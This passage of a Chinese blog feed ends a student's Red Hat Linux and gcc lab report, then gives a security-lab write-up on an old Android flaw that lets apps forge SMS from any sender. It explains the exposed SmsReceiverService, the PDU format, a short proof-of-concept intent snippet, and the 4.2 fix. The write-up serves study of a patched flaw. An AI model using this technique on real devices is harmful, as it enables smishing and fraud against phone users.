<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/14-9.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/14-10.png" class=""></div></div></div></div><div class="tab-pane" id="process_man-6"><p><code>kill [sig] &lt;pid&gt;</code> 杀死进程，强杀进程一般使用信号 <code>-9(SIGKILL)</code>，因为其他信号都可以被忽略 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/14-11.png" class=""></p></div></div></div></div></div></div></div><div class="tab-pane" id="linux-commands-5"><div class="tabs" id="other"><ul class="nav-tabs"><li class="tab active"><a href="#other-1">echo</a></li><li class="tab"><a href="#other-2">cal</a></li><li class="tab"><a href="#other-3">date</a></li><li class="tab"><a href="#other-4">clear</a></li></ul><div class="tab-content"><div class="tab-pane active" id="other-1"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/15.png" class="">
<p>在终端中回显输出用户的字符串。</p></div><div class="tab-pane" id="other-2"><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/16-1.png" class="" title="无参数，当月日历"></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/16-2.png" class="" title="-y参数，当年日历"></div></div></div>
<p>显示日历。</p></div><div class="tab-pane" id="other-3"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/17.png" class="">
<p>输出日期和时间。</p></div><div class="tab-pane" id="other-4"><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/18-1.png" class="" title="清空前"></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/18-2.png" class="" title="清空后"></div></div></div>
<p>清空当前终端中的内容（实际上表现为滚动条向下滚动）。</p></div></div></div></div></div></div>
<h4 id="Vi的基本使用">Vi 的基本使用</h4>
<blockquote><p>Linux 系统中一般会内置 vi 作为文本编辑器，用命令 <code>vi xxx</code> 启用后，有三种模式：命令模式（Command mode），输入模式（Insert mode）和底线命令模式（Last line mode）。刚刚进入 vi 时，是命令模式，任何输入字符不会加入文件中，而是被解析为命令运行，想要进入输入模式，需要按键盘<kbd> i</kbd> 键。输入完成后，可按<kbd> ESC</kbd> 键退回命令模式。要退出程序，需要按<kbd>:</kbd> 键，切换到底线命令模式中，然后输入<kbd> q</kbd> 不保存退出或输入<kbd> w</kbd> 保存退出。底线命令模式中支持的命令比命令模式要多。</p>
</blockquote> 
<p>下面是一些命令的运行效果截图。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/19-1.png" class="" title="用vi new.txt创建一个新文件并同时进入编辑模式"></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/19-2.png" class="" title="按i键进入编辑模式"></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/19-3.png" class="" title="编辑结束，按ESC键退出编辑模式"></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/19-4.png" class="" title="按冒号键切换到底线命令模式"></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/19-5.png" class="" title="输入wq!保存并退出"></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/19-6.png" class="" title="验证文件内容是否被正确保存"></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/19-7.png" class="" title="然后再次编辑，但这次退出时使用q选项"></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/19-8.png" class="" title="发现新加的内容没有保存"></div></div></div>
<h4 id="Linux系统中的gcc编译器">Linux 系统中的 gcc 编译器</h4>
<blockquote><p>GCC 原名为 GNU C 语言编译器（GNU C Compiler），因为它原本只能处理 C 语言。GCC 很快地扩展，变得可处理 C++。后来又扩展为能够支持更多编程语言，如 Fortran、Pascal、Objective-C、Java、Ada、Go 以及各类处理器架构上的汇编语言等，所以改名 GNU 编译器套件（GNU Compiler Collection）。</p>
</blockquote>
<p>安装 Linux 系统时本应选择预装 gcc 套件的，但当时并没有考虑到这个需求。还好 Red Hat 的镜像中有 gcc 的软件包，仍旧可以安装。安装过程不再详述。</p>
<p>用 vi 编写一个简单的 c 程序，保存为 <code>hello.c</code>。</p>
<figure class="highlight c"><figcaption><span>hello.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*--hello.c--*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Hello world\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>使用 <code>gcc</code> 命令编译该源代码。<code>-o</code> 参数指定生成目标文件，它可以直接执行（有 x 权限）。</p>
<div class="tabs" id="using-gcc"><ul class="nav-tabs"><li class="tab active"><a href="#using-gcc-1">编译</a></li><li class="tab"><a href="#using-gcc-2">执行</a></li></ul><div class="tab-content"><div class="tab-pane active" id="using-gcc-1"><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gcc hello.c -o hello</span><br></pre></td></tr></tbody></table></figure>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/20-1.png" class=""></div><div class="tab-pane" id="using-gcc-2"><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">./hello</span><br></pre></td></tr></tbody></table></figure>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/20-2.png" class=""></div></div></div>
<h2 id="实验关键里程碑数据与结果">实验关键里程碑数据与结果</h2>
<h3 id="安装Red-Hat-Linux-2">安装 Red Hat Linux</h3>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-2.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-3.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-4.png" class=""></div></div></div>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-5-1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-5-2.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-6-1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-6-2.png" class=""></div></div></div>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-7.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-8.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-9-1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-9-2.png" class=""></div></div></div>
<h3 id="安装gcc编译器">安装 gcc 编译器</h3>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/%E9%99%843.png" class="">
<h2 id="实验难点与收获">实验难点与收获</h2>
<p>完成本实验花费了个人约 8 个小时的时间，其中有 6 个小时的 “上机” 时间（在系统），剩余时间用于实验报告的写作上。感觉这次的实验还是很简单的，基本上没有难点，除了最后在配置 gcc 软件包时，需要先安装大量依赖软件包，占用了一些时间。</p>
<h2 id="实验思考">实验思考</h2>
<ul>
<li>
<p>通过本实验，我感受到了 Linux 系统相对于 Windows 的强安全性。</p>
<ul>
<li>首先，Linux 系统在终端中输入任何密码时，都不会有回显，在设置用户密码时，要求它有一定的强度（≥8 个字符，且还要通过字典检查）</li>
<li>除了 root 用户，所有其他用户的根目录均局限于 <code>home</code> 目录下，由于权限码的限制，一旦离开了 <code>home</code> 目录，便很难再拥有权限操作文件，因为往往系统文件的权限值对于其他用户均设置为很低的值，而且 Red Hat Linux 对于创建的新用户，默认是连 sudo 权限都没有的（下图，还带着提示），这意味着他们几乎不可能进入系统空间和其他用户的空间，也更不可能列出文件目录或者是执行文件。</li>
</ul>
  <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/%E9%99%841.png" class="" title="新用户默认没有sudo权限">
</li>
<li>
<p>Linux 系统的命令是相对于 Windows 系统来说最大的不同点，用惯了图形化界面操作系统的人，总归对冷冰冰的命令行页面下不去手。这次的安装虽然装的是带有 GUI 界面的服务器版本（下图），但主要的操作还是放到了命令行中，因为可以很直观的看到输出。</p>
  <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-6-2.png" class="" width="400" title="安装时可以选择带有GUI的服务器">
</li>
<li>
<p>上手使用了一些 Linux 中的命令后，感觉还是比较好掌握的，因为它们基本上是一些英文单词的缩写。命令格式也非常好理解，一个短横线往往跟短选项，而两个短横线往往跟长选项。有些短选项是可以合并的（比如 <code>ls -la</code> 等价于 <code>ls -l -a</code>）。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>实验</category>
        <category>技术</category>
        <category>OS</category>
        <category>操作系统内核</category>
        <category>Red Hat Linux</category>
      </categories>
      <tags>
        <tag>OS</tag>
        <tag>Red Hat Linux</tag>
        <tag>gcc</tag>
      </tags>
  </entry>
  <entry>
    <title>移动安全 - 短信欺诈漏洞验证</title>
    <url>/2020/06/03/experiments/security/sms/</url>
    <content><![CDATA[<h2 id="漏洞介绍">漏洞介绍</h2>
<p>原生安卓 4.0 系统中，有一个名称为 SMS smishing vuln 的漏洞，其具体表现为任意应用可以在没有 <code>write_sms</code> 权限下伪造任意发件人的任意短信，影响范围从 Android 1.6 系统一直到 4.1 系统。Android 4.2 系统修复了这个安全漏洞。</p>
<span id="more"></span>
<h2 id="原理分析">原理分析</h2>
<p>与短信服务相关的 <code>/system/app/Mms.apk</code> 的 <code>AndroidManifest.xml</code> 文件 <sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup> 中，<code>smsReceiverService</code> 没有以正确的权限声明，被暴露在外，而且服务暴露之后，没有使用 <code>permission</code> 或签名声明，没有判断调用者，甚至也没有一般声明，这是相当危险的。</p>
<figure class="highlight xml"><figcaption><span>/packages/apps/Mms/AndroidManifest.xml</span><a href="http://androidxref.com/4.0.3_r1/xref/packages/apps/Mms/AndroidManifest.xml">AndroidManifest.xml</a></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">android:name</span>=<span class="string">"MmsApp"</span></span></span><br><span class="line"><span class="tag">             <span class="attr">android:label</span>=<span class="string">"@string/app_label"</span></span></span><br><span class="line"><span class="tag">             <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher_smsmms"</span></span></span><br><span class="line"><span class="tag">             <span class="attr">android:taskAffinity</span>=<span class="string">"android.task.mms"</span></span></span><br><span class="line"><span class="tag">             <span class="attr">android:allowTaskReparenting</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">             <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">".transaction.TransactionService"</span></span></span><br><span class="line marked"><span class="tag">                      <span class="attr">android:exported</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">             <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">".transaction.SmsReceiverService"</span></span></span><br><span class="line marked"><span class="tag">                      <span class="attr">android:exported</span>=<span class="string">"true"</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="构造PDU">构造 PDU</h3>
<ul>
<li>安卓设备接收到的 SMS 是 PDU 形式的 (protocol description unit)，其相关信息由 <code>android.telephony.gsm.SmsMessage</code> 类存储，我们可以从接收到的 PDU 中创建 <code>SmsMessage</code> 实例，令 Toast 组件以系统通知形式来显示信息文本。</li>
<li>在 <code>SmsMessage.java</code> 中，处理用户数据的方式依靠 <code>getSubmitPdu</code> 方法。其中将尝试 7bit 和 UCS-2 两种编码方式。无论是哪种编码方式，PDU 的结构大致如下所示：</li>
</ul>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">A|B|C|D|E|F|G|H|I|J|K|L|M </span><br></pre></td></tr></tbody></table></figure>
<div class="tabs" id="pdu"><ul class="nav-tabs"><li class="tab active"><a href="#pdu-1">A</a></li><li class="tab"><a href="#pdu-2">B</a></li><li class="tab"><a href="#pdu-3">C</a></li><li class="tab"><a href="#pdu-4">D</a></li><li class="tab"><a href="#pdu-5">E</a></li><li class="tab"><a href="#pdu-6">F</a></li><li class="tab"><a href="#pdu-7">G</a></li><li class="tab"><a href="#pdu-8">H</a></li><li class="tab"><a href="#pdu-9">I</a></li><li class="tab"><a href="#pdu-10">J</a></li><li class="tab"><a href="#pdu-11">K</a></li><li class="tab"><a href="#pdu-12">L</a></li><li class="tab"><a href="#pdu-13">M</a></li></ul><div class="tab-content"><div class="tab-pane active" id="pdu-1"><p>短信息中心地址长度，2 位十六进制数 (1 字节)。</p></div><div class="tab-pane" id="pdu-2"><p>短信息中心号码类型，2 位十六进制数。</p></div><div class="tab-pane" id="pdu-3"><p>短信息中心号码，B+C 的长度将由 A 中的数据决定。</p></div><div class="tab-pane" id="pdu-4"><p>文件头字节，2 位十六进制数。</p></div><div class="tab-pane" id="pdu-5"><p>信息类型，2 位十六进制数。</p></div><div class="tab-pane" id="pdu-6"><p>被叫号码长度，2 位十六进制数。</p></div><div class="tab-pane" id="pdu-7"><p>被叫号码类型，2 位十六进制数，取值同 B。</p></div><div class="tab-pane" id="pdu-8"><p>被叫号码，长度由 F 中的数据决定。</p></div><div class="tab-pane" id="pdu-9"><p>协议标识，2 位十六进制数。</p></div><div class="tab-pane" id="pdu-10"><p>数据编码方案，2 位十六进制数。</p></div><div class="tab-pane" id="pdu-11"><p>有效期，2 位十六进制数。</p></div><div class="tab-pane" id="pdu-12"><p>用户数据长度，2 位十六进制数。</p></div><div class="tab-pane" id="pdu-13"><p>用户数据，其长度由 L 中的数据决定。J 中设定采用 UCS2 编码，这里是中英文的 Unicode 字符。</p></div></div></div>
<ul>
<li>既然解析和构造 SMS 的方法是已知的，那么我们就会有办法不经其他手机号码，任意构造消息，而被其他手机接收。</li>
</ul>
<figure class="highlight java"><figcaption><span>SmsMessage.java</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] userData; </span><br><span class="line"><span class="keyword">try</span>{</span><br><span class="line">  <span class="keyword">if</span>(encoding == ENCODING_7BIT){ </span><br><span class="line">    userData = GsmAlphabet.stringToGsm7BitPackedWithHeader(message, header, languageTable, languageShiftTable); </span><br><span class="line">  } <span class="keyword">else</span>{ <span class="comment">//assume UCS-2 </span></span><br><span class="line">    <span class="keyword">try</span>{ </span><br><span class="line">      userData = encodeUCS2(message, header); </span><br><span class="line">    }<span class="keyword">catch</span>(UnsupportedEncodingException uex){ </span><br><span class="line">      Log.e(LOG_TAG, <span class="string">"Implausible UnsupportedEncodingException "</span>, uex); </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>; </span><br><span class="line">    } </span><br><span class="line">  }</span><br><span class="line">}<span class="keyword">catch</span>(EncodeException ex){ <span class="comment">// Encoding to the 7-bit alphabet failed. Let's see if we can send it as a UCS-2 encoded message </span></span><br><span class="line">  <span class="keyword">try</span>{ </span><br><span class="line">    userData = encodeUCS2(message, header); </span><br><span class="line">    encoding = ENCODING_16BIT; </span><br><span class="line">  }<span class="keyword">catch</span>(UnsupportedEncodingException uex){ </span><br><span class="line">    Log.e(LOG_TAG, <span class="string">"Implausible UnsupportedEncodingException "</span>, uex); </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; </span><br><span class="line">  } </span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure>
<h3 id="启动-code-SmsReceiverService-code">启动 <code>SmsReceiverService</code></h3>
<figure class="highlight java"><figcaption><span>MainActivity.java</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// pass to SmsReceiverService which has the permission to send short message</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(); </span><br><span class="line">intent.setClassName(<span class="string">"com.android.mms"</span>, <span class="string">"com.android.mms.transaction.SmsReceiverService"</span>); </span><br><span class="line">intent.setAction(<span class="string">"android.provider.Telephony.SMS_RECEIVED"</span>);</span><br><span class="line">intent.putExtra(<span class="string">"pdus"</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] { pdu }); </span><br><span class="line">intent.putExtra(<span class="string">"format"</span>, <span class="string">"3gpp"</span>); </span><br><span class="line">context.startService(intent); </span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>POC 在上图代码中启用了短信接收服务（<code>SmsReceiverService</code>），当服务启动时，经过了 <code>onStartCommand</code> → <code>mServiceHandler.sendMessage(msg)</code>，消息进入 <code>ServiceHandler</code> 的消息队列中，在 <code>handleMessage</code> 中得到处理，由于 <code>action</code> 是 <code>SMS_RECEIVED</code>，所以进入 <code>handleSmsReceived</code> 函数。</li>
</ul>
<figure class="highlight java"><figcaption><span>SmsReceiverService.java</span><a href="http://androidxref.com/4.0.3_r1/xref/packages/apps/Mms/src/com/android/mms/transaction/SmsReceiverService.java#124ServiceHandler">link</a></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> flags, <span class="type">int</span> startId)</span> {</span><br><span class="line"><span class="comment">// Temporarily removed for this duplicate message track down.</span></span><br><span class="line"></span><br><span class="line">        mResultCode = intent != <span class="literal">null</span> ? intent.getIntExtra(<span class="string">"result"</span>, <span class="number">0</span>) : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mResultCode != <span class="number">0</span>) {</span><br><span class="line">            Log.v(TAG, <span class="string">"onStart: #"</span> + startId + <span class="string">" mResultCode: "</span> + mResultCode +</span><br><span class="line">                    <span class="string">" = "</span> + translateResultCode(mResultCode));</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> mServiceHandler.obtainMessage();</span><br><span class="line">        msg.arg1 = startId;</span><br><span class="line">        msg.obj = intent;</span><br><span class="line marked">        mServiceHandler.sendMessage(msg);</span><br><span class="line">        <span class="keyword">return</span> Service.START_NOT_STICKY;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight java"><figcaption><span>SmsReceiverService.java#ServiceHandler</span><a href="http://androidxref.com/4.0.3_r1/xref/packages/apps/Mms/src/com/android/mms/transaction/SmsReceiverService.java#177ServiceHandler">link</a></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ServiceHandler</span> <span class="keyword">extends</span> <span class="title class_">Handler</span> {</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">ServiceHandler</span><span class="params">(Looper looper)</span> {</span><br><span class="line">		<span class="built_in">super</span>(looper);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Handle incoming transaction requests.</span></span><br><span class="line"><span class="comment">        * The incoming requests are initiated by the MMSC Server or by the MMS Client itself.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(Message msg)</span> {</span><br><span class="line">           <span class="type">int</span> <span class="variable">serviceId</span> <span class="operator">=</span> msg.arg1;</span><br><span class="line">           <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> (Intent)msg.obj;</span><br><span class="line">           <span class="keyword">if</span> (Log.isLoggable(LogTag.TRANSACTION, Log.VERBOSE)) {</span><br><span class="line">               Log.v(TAG, <span class="string">"handleMessage serviceId: "</span> + serviceId + <span class="string">" intent: "</span> + intent);</span><br><span class="line">           }</span><br><span class="line">           <span class="keyword">if</span> (intent != <span class="literal">null</span>) {</span><br><span class="line">               <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line"></span><br><span class="line">               <span class="type">int</span> <span class="variable">error</span> <span class="operator">=</span> intent.getIntExtra(<span class="string">"errorCode"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (Log.isLoggable(LogTag.TRANSACTION, Log.VERBOSE)) {</span><br><span class="line">                   Log.v(TAG, <span class="string">"handleMessage action: "</span> + action + <span class="string">" error: "</span> + error);</span><br><span class="line">               }</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (MESSAGE_SENT_ACTION.equals(intent.getAction())) {</span><br><span class="line">                   handleSmsSent(intent, error);</span><br><span class="line">               } <span class="keyword">else</span> <span class="keyword">if</span> (SMS_RECEIVED_ACTION.equals(action)) {</span><br><span class="line marked">                   handleSmsReceived(intent, error);</span><br><span class="line">               } <span class="keyword">else</span> <span class="keyword">if</span> (ACTION_BOOT_COMPLETED.equals(action)) {</span><br><span class="line">                   handleBootCompleted();</span><br><span class="line">               } <span class="keyword">else</span> <span class="keyword">if</span> (TelephonyIntents.ACTION_SERVICE_STATE_CHANGED.equals(action)) {</span><br><span class="line">                   handleServiceStateChanged(intent);</span><br><span class="line">               } <span class="keyword">else</span> <span class="keyword">if</span> (ACTION_SEND_MESSAGE.endsWith(action)) {</span><br><span class="line">                   handleSendMessage();</span><br><span class="line">               }</span><br><span class="line">           }</span><br><span class="line">           <span class="comment">// <span class="doctag">NOTE:</span> We MUST not call stopSelf() directly, since we need to</span></span><br><span class="line">           <span class="comment">// make sure the wake lock acquired by AlertReceiver is released.</span></span><br><span class="line">           SmsReceiver.finishStartingService(SmsReceiverService.<span class="built_in">this</span>, serviceId);</span><br><span class="line">       }</span><br><span class="line">   }</span><br><span class="line"><span class="comment">/* ... */</span> </span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure>
<div class="tabs" id="messages"><ul class="nav-tabs"><li class="tab active"><a href="#messages-1"><i class="fa fa-code"></i>handleSmsReceived</a></li><li class="tab"><a href="#messages-2"><i class="fa fa-code"></i>insertMessage</a></li></ul><div class="tab-content"><div class="tab-pane active" id="messages-1"><figure class="highlight java"><figcaption><span>SmsReceiverService.java</span><a href="http://androidxref.com/4.0.3_r1/xref/packages/apps/Mms/src/com/android/mms/transaction/SmsReceiverService.java#352ServiceHandler">link</a></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleSmsReceived</span><span class="params">(Intent intent, <span class="type">int</span> error)</span> {</span><br><span class="line">    SmsMessage[] msgs = Intents.getMessagesFromIntent(intent);</span><br><span class="line">    <span class="type">String</span> <span class="variable">format</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">"format"</span>);</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">messageUri</span> <span class="operator">=</span> insertMessage(<span class="built_in">this</span>, msgs, error, format);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Log.isLoggable(LogTag.TRANSACTION, Log.VERBOSE) || LogTag.DEBUG_SEND) {</span><br><span class="line">        <span class="type">SmsMessage</span> <span class="variable">sms</span> <span class="operator">=</span> msgs[<span class="number">0</span>];</span><br><span class="line">        Log.v(TAG, <span class="string">"handleSmsReceived"</span> + (sms.isReplace() ? <span class="string">"(replace)"</span> : <span class="string">""</span>) +</span><br><span class="line">                <span class="string">" messageUri: "</span> + messageUri +</span><br><span class="line">                <span class="string">", address: "</span> + sms.getOriginatingAddress() +</span><br><span class="line">                <span class="string">", body: "</span> + sms.getMessageBody());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (messageUri != <span class="literal">null</span>) {</span><br><span class="line">        <span class="comment">// Called off of the UI thread so ok to block.</span></span><br><span class="line marked">        MessagingNotification.blockingUpdateNewMessageIndicator(<span class="built_in">this</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="messages-2"><figure class="highlight java"><figcaption><span>SmsReceiverService.java</span><a href="http://androidxref.com/4.0.3_r1/xref/packages/apps/Mms/src/com/android/mms/transaction/SmsReceiverService.java#419ServiceHandler">link</a></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* If the message is a class-zero message, display it immediately</span></span><br><span class="line"><span class="comment">* and return null.  Otherwise, store it using the</span></span><br><span class="line"><span class="comment">* &lt;code&gt;ContentResolver&lt;/code&gt; and return the</span></span><br><span class="line"><span class="comment">* &lt;code&gt;Uri&lt;/code&gt; of the thread containing this message</span></span><br><span class="line"><span class="comment">* so that we can use it for notification.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> Uri <span class="title function_">insertMessage</span><span class="params">(Context context, SmsMessage[] msgs, <span class="type">int</span> error, String format)</span> {</span><br><span class="line">    <span class="comment">// Build the helper classes to parse the messages.</span></span><br><span class="line">    <span class="type">SmsMessage</span> <span class="variable">sms</span> <span class="operator">=</span> msgs[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sms.getMessageClass() == SmsMessage.MessageClass.CLASS_0) {</span><br><span class="line">        displayClassZeroMessage(context, sms, format);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (sms.isReplace()) {</span><br><span class="line marked">        <span class="keyword">return</span> replaceMessage(context, msgs, error);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line marked">        <span class="keyword">return</span> storeMessage(context, msgs, error);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div></div></div>
<ul>
<li>在 <code>handleSmsReceived</code> 中，<code>MessagingNotification.blockingUpdateNewMessageIndicator()</code> 调用即为我们平时看见的新信息提示条。</li>
<li><code>insertMessage</code> 中，下面的两个分支最终都会进入 <code>storeMessage</code> 函数中，短信息会被存储在系统数据库中。</li>
</ul>
<h2 id="验证截图">验证截图</h2>
<p>我利用了安卓 4.0 的虚拟机来复现这个漏洞，设备信息截图如下 <img data-src="/2020/06/03/experiments/security/sms/device.png" class=""></p>
<p>测试的效果见下面的五张图</p>
<div class="note info"><p>AVD 没有装中文输入法测不了中文，但是应该是没有问题的</p>
</div>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2020/06/03/experiments/security/sms/try1.jpg" class=""></div><div class="group-picture-column"><img data-src="/2020/06/03/experiments/security/sms/try2.jpg" class=""></div><div class="group-picture-column"><img data-src="/2020/06/03/experiments/security/sms/try3.jpg" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2020/06/03/experiments/security/sms/try4.jpg" class=""></div><div class="group-picture-column"><img data-src="/2020/06/03/experiments/security/sms/try5.jpg" class=""></div></div></div>
<h2 id="官方的修复措施">官方的修复措施</h2>
<p>4.2.1 版本的短信应用（<code>Mms.apk</code>）的 <code>AndroidManifest.xml</code> 中 <sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>，<code>SmsReceiver</code> 不再被暴露。</p>
<figure class="highlight xml"><figcaption><span>/packages/apps/Mms/AndroidManifest.xml</span><a href="http://androidxref.com/4.2_r1/xref/packages/apps/Mms/AndroidManifest.xml#45">AndroidManifest.xml</a></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">android:name</span>=<span class="string">"MmsApp"</span></span></span><br><span class="line"><span class="tag">             <span class="attr">android:label</span>=<span class="string">"@string/app_label"</span></span></span><br><span class="line"><span class="tag">             <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher_smsmms"</span></span></span><br><span class="line"><span class="tag">             <span class="attr">android:taskAffinity</span>=<span class="string">"android.task.mms"</span></span></span><br><span class="line"><span class="tag">             <span class="attr">android:allowTaskReparenting</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">".transaction.TransactionService"</span></span></span><br><span class="line marked"><span class="tag">                 <span class="attr">android:exported</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">".transaction.SmsReceiverService"</span></span></span><br><span class="line marked"><span class="tag">                 <span class="attr">android:exported</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="结论">结论</h2>
